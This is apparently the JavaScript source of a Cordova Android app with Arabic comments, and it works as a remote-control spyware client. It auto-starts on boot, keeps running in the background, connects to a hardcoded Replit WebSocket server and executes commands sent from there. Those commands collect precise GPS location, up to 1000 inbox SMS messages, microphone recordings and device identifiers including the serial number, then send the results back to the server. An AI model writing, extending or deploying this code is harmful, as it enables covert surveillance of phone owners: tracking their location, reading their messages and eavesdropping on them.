document.addEventListener('deviceready', onDeviceReady, false);

// === إعدادات عامة/عالمية ===
const WS_URL = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
const HEARTBEAT_MS = 30_000;          // نبضات للحفاظ على الاتصال
const RECONNECT_BASE_MS = 5_000;      // بداية backoff
const RECONNECT_MAX_MS = 60_000;      // حد أقصى backoff
const receivedRequests = [];
let ws = null;
let heartbeatTimer = null;
let reconnectTimer = null;
let reconnectAttempts = 0;
let deviceInfo = null;

function onDeviceReady() {
  console.log('Device is ready');

  // === تشغيل تلقائي بعد الإقلاع ===
  if (window.autostart && autostart.enable) {
    try { autostart.enable(); } catch (e) { console.warn('Autostart enable err', e); }
  }

  // === تشغيل كخدمة أمامية/خلفية لمنع القتل ===
  if (cordova.plugins && cordova.plugins.backgroundMode) {
    const bg = cordova.plugins.backgroundMode;

    bg.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'متصل بالخادم وينفذ الأوامر',
      resume: true,
      hidden: false,
      silent: false
    });

    bg.enable();

    // تقليل قتل WebView تحت Doze
    if (bg.disableBatteryOptimizations) {
      try { bg.disableBatteryOptimizations(); } catch (e) { console.warn('disableBatteryOptimizations err', e); }
    }

    bg.on('activate', () => {
      try {
        // يحافظ على أداء الـ WebView
        if (bg.disableWebViewOptimizations) bg.disableWebViewOptimizations();
        // تأكد من إظهار الإشعار كثبات الخدمة الأمامية
        bg.configure({ hidden: false, silent: false });
      } catch (e) { console.warn('bg activate err', e); }
    });

    // لو رجع للتطبيق/خرج — نبقى شغالين
    bg.on('deactivate', () => {
      try { bg.enable(); } catch (e) { console.warn('bg deactivate err', e); }
    });
  }

  // الاستماع لتغيّر الشبكة
  document.addEventListener('online', handleOnline, false);
  document.addEventListener('offline', handleOffline, false);

  // استئناف التطبيق
  document.addEventListener('resume', () => {
    console.log('App resumed');
    ensureSocket();
  }, false);

  // التقاط أخطاء غير ملتقطة (للاستقرار)
  window.addEventListener('unhandledrejection', e => console.warn('Unhandled Rejection:', e.reason));
  window.addEventListener('error', e => console.warn('Window error:', e.message));

  // تجهيز معلومات الجهاز
  deviceInfo = buildDeviceInfo();

  // تحديثات البطارية
  setupBatteryMonitoring();

  // ابدأ الاتصال
  ensureSocket();
}

// ===== معلومات الجهاز / UUID ثابت =====
function buildDeviceInfo() {
  let storedId = null;
  try { storedId = localStorage.getItem('device_uuid'); } catch (_) {}

  const uuid = storedId || (window.device && device.uuid) || generateUUID();
  if (!storedId) {
    try { localStorage.setItem('device_uuid', uuid); } catch (_) {}
  }

  const info = {
    uuid,
    model: (window.device && device.model) || 'Unknown',
    platform: (window.device && device.platform) || 'Unknown',
    version: (window.device && device.version) || 'Unknown',
    manufacturer: (window.device && device.manufacturer) || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };

  return info;
}

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ===== مراقبة البطارية =====
function setupBatteryMonitoring() {
  if (!navigator.getBattery) return;

  navigator.getBattery().then(battery => {
    updateBatteryInfo(battery);
    battery.addEventListener('levelchange', () => updateBatteryInfo(battery));
    battery.addEventListener('chargingchange', () => updateBatteryInfo(battery));
  }).catch(err => console.warn('Battery API error:', err));
}

function updateBatteryInfo(battery) {
  deviceInfo.battery = {
    level: Math.round(battery.level * 100),
    charging: battery.charging,
    chargingTime: battery.chargingTime,
    dischargingTime: battery.dischargingTime
  };

  // إرسال تحديث سريع لو نحن متصلين
  if (ws && ws.readyState === WebSocket.OPEN) {
    safeSend({
      type: 'device_update',
      deviceInfo: { battery: deviceInfo.battery, timestamp: new Date().toISOString() }
    });
  }
}

// ===== إدارة الشبكة =====
function handleOnline() {
  console.log('Network online');
  ensureSocket(true);
}

function handleOffline() {
  console.log('Network offline');
  // لا نغلق الـ ws يدويًا؛ سيُغلق وحده ونحاول لاحقًا
}

// ===== WebSocket =====
function ensureSocket(forceReconnect = false) {
  // إن كان مفتوحًا لا تلمسه
  if (!forceReconnect && ws && ws.readyState === WebSocket.OPEN) return;

  // إن هناك سوكِت قديم — أغلقه
  if (ws && ws.readyState !== WebSocket.CLOSED) {
    try { ws.close(); } catch (_) {}
  }

  connectToServer();
}

function connectToServer() {
  clearTimers();

  try {
    ws = new WebSocket(WS_URL);
  } catch (e) {
    console.error('WS create error:', e);
    scheduleReconnect();
    return;
  }

  ws.onopen = () => {
    console.log('Connected to server');
    reconnectAttempts = 0;

    // سجل الجهاز
    safeSend({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    });

    // ابدأ نبضات القلب
    heartbeatTimer = setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        safeSend({
          type: 'heartbeat',
          timestamp: new Date().toISOString(),
          receivedRequests
        });
      }
    }, HEARTBEAT_MS);
  };

  ws.onmessage = (event) => {
    let data = null;
    try { data = JSON.parse(event.data); } catch (e) {
      console.warn('Non-JSON message:', event.data);
      return;
    }

    if (data.type === 'command') {
      console.log('Received command:', data.command);
      receivedRequests.push({ ...data.command, receivedAt: new Date().toISOString() });

      executeCommand(data.command, (response) => {
        if (ws && ws.readyState === WebSocket.OPEN) {
          safeSend({
            type: 'response',
            commandId: data.commandId,
            response: { ...response, requestData: data.command }
          });
        }
      });
    } else if (data.type === 'registered') {
      console.log('Device registered successfully:', data);
    }
  };

  ws.onerror = (error) => {
    console.error('WebSocket error:', error && error.message ? error.message : error);
  };

  ws.onclose = (evt) => {
    console.log('Disconnected from server', evt && evt.code);
    scheduleReconnect();
  };
}

function scheduleReconnect() {
  clearTimers();
  const delay = Math.min(RECONNECT_BASE_MS * Math.pow(2, reconnectAttempts), RECONNECT_MAX_MS);
  reconnectAttempts++;
  console.log(`Reconnecting in ${delay} ms...`);
  reconnectTimer = setTimeout(() => ensureSocket(true), delay);
}

function clearTimers() {
  if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
  if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
}

function safeSend(obj) {
  try {
    ws.send(JSON.stringify(obj));
  } catch (e) {
    console.warn('safeSend error:', e);
  }
}

// ===== تنفيذ الأوامر =====
function executeCommand(command, callback) {
  console.log('Executing command:', command);
  const commandId = Date.now();

  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;

    case 'get_sms':
      getSMS(commandId, callback);
      break;

    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;

    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;

    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;

    default:
      callback({
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

// ===== الموقع =====
function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };

      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

// ===== SMS =====
function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }

  const filter = { box: 'inbox', maxCount: 1000, indexFrom: 0 };

  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

// ===== تسجيل الصوت =====
function recordAudio(commandId, duration, callback) {
  duration = duration || 10;

  // إن وُجدت media capture — استخدمها (أوثق على أندرويد)
  if (navigator.device && navigator.device.capture && navigator.device.capture.captureAudio) {
    navigator.device.capture.captureAudio(
      (mediaFiles) => {
        // خذ أول ملف
        const f = mediaFiles[0];
        callback({
          commandId,
          status: 'success',
          audio: {
            duration,
            format: 'amr/mp3',
            size: f.size,
            downloadUrl: f.fullPath || f.localURL || '',
            fileName: f.name || `recording_${commandId}`
          }
        });
      },
      (err) => {
        callback({
          commandId, status: 'error',
          error: 'Audio capture error',
          details: JSON.stringify(err)
        });
      },
      { limit: 1, duration: duration }
    );
    return;
  }

  // fallback عبر MediaRecorder (قد لا يعمل على بعض الأجهزة/الإصدارات)
  const mediaRecorderOptions = { mimeType: 'audio/webm' };
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];

      mediaRecorder.ondataavailable = event => { if (event.data && event.data.size) audioChunks.push(event.data); };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        const fileName = `recording_${commandId}.webm`;
        saveBlobToDataDir(fileName, audioBlob, () => {
          const audioUrl = cordova.file.dataDirectory + fileName;
          callback({
            commandId,
            status: 'success',
            audio: {
              duration,
              format: 'webm',
              size: audioBlob.size,
              downloadUrl: audioUrl,
              fileName
            }
          });
        }, (e) => {
          callback({ commandId, status: 'error', error: 'Save audio error', details: e.toString() });
        });
      };

      mediaRecorder.start();
      setTimeout(() => {
        try { mediaRecorder.stop(); } catch (_) {}
        stream.getTracks().forEach(t => t.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

// حفظ ملف Blob في مجلد بيانات التطبيق
function saveBlobToDataDir(fileName, blob, onSuccess, onError) {
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = onSuccess;
        fileWriter.onerror = e => onError(e);
        fileWriter.write(blob);
      }, onError);
    }, onError);
  }, onError);
}

// ===== معلومات الجهاز =====
function getDeviceInfo(commandId, callback) {
  const d = window.device || {};
  const info = {
    cordova: d.cordova,
    model: d.model,
    platform: d.platform,
    uuid: deviceInfo.uuid, // استخدم UUID الثابت
    version: d.version,
    manufacturer: d.manufacturer,
    isVirtual: d.isVirtual,
    serial: d.serial
  };

  callback({ commandId, status: 'success', deviceInfo: info });
}

// ===== سجل الطلبات =====
function getReceivedRequests(commandId, callback) {
  callback({ commandId, status: 'success', requests: receivedRequests, count: receivedRequests.length });
}
